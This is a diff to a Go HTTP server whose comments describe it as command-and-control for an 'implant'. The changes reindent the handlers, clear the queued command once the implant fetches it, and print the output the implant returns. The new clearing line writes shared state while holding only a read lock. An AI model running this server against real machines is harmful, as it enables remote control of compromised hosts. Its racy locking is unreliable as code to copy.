@@ -14,45 +14,47 @@ var (
 	storedCommand *Command
 )
 
-// Method for the operator to actually send the command to the implant
 func getCommand(w http.ResponseWriter, r *http.Request) {
-	defer r.Body.Close()
+    defer r.Body.Close()
 
-	// Set the response content type to JSON
-	w.Header().Set("Content-Type", "application/json")
+    // Set the response content type to JSON
+    w.Header().Set("Content-Type", "application/json")
 
-	// Define a switch statement to handle GET or POST requests
-	switch r.Method {
-	case "GET":
-		// If the request is a GET request, we unlock the Mutex and release the command for the implant
-		mu.RLock()
-		defer mu.RUnlock()
+    // Define a switch statement to handle GET or POST requests
+    switch r.Method {
+    case "GET":
+        // If the request is a GET request, we lock the Mutex to access the command
+        mu.RLock()
+        defer mu.RUnlock()
 
-		// Since the command is basically "consumed", we check if there is a command that has not been released
-		if storedCommand == nil {
-			http.Error(w, "No command available", http.StatusNotFound)
-			return
-		}
+        // Check if there is a command that has not been released
+        if storedCommand == nil {
+            http.Error(w, "No command available", http.StatusNotFound)
+            return
+        }
 
-		// If such command exists, unmarshal it so that we can send it to the impant
-		jsonCommand, err := json.Marshal(storedCommand)
-		if err != nil {
-			http.Error(w, err.Error(), http.StatusInternalServerError)
-			return
-		}
+        // Marshal the command to JSON
+        jsonCommand, err := json.Marshal(storedCommand)
+        if err != nil {
+            http.Error(w, err.Error(), http.StatusInternalServerError)
+            return
+        }
 
-		w.WriteHeader(http.StatusOK)
+        w.WriteHeader(http.StatusOK)
 
-		// Write the JSON command to the response
-		if _, err := w.Write(jsonCommand); err != nil {
-			http.Error(w, err.Error(), http.StatusInternalServerError)
-			return
-		}
+        // Write the JSON command to the response
+        if _, err := w.Write(jsonCommand); err != nil {
+            http.Error(w, err.Error(), http.StatusInternalServerError)
+            return
+        }
 
-	default:
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
+        // Since the command is "consumed", set storedCommand to nil
+        storedCommand = nil
+
+    default:
+        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+        return
+    }
 }
 
 func postCommand(w http.ResponseWriter, r *http.Request) {
@@ -91,11 +93,15 @@ func postOutput(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Print the body to the console
+	fmt.Println("Received output:", string(body))
+
 	// Lock the mutex and save the body in the outputBuffer
 	bufferMutex.Lock()
 	outputBuffer = body
 	bufferMutex.Unlock()
 
+	// If you still want to use the alert function
 	alert("Received output from Implant")
 }
 
